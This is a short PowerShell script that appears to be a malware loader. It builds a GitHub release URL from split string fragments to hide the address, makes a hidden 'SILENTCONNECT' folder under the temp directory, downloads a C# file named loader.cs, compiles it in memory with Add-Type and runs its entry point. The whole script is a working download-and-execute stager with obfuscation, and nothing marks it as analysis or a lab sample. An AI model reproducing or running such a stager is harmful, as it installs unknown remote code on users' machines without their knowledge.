$p=@("ht","tps://g","ithub.c","om/norma","ngarceau","622-dot/s","creen/r","eleases/","download/","Loader/lo","ader.cs");$u=$p -join ""
$t="$env:TEMP\SILENTCONNECT";if(-not(Test-Path $t)){New-Item -ItemType Directory -Path $t|Out-Null}
$c=(New-Object System.Net.WebClient).DownloadString($u)
$f="$t\loader.cs";[System.IO.File]::WriteAllText($f,$c)
Add-Type -Path $f
[a.b]::Main($null)
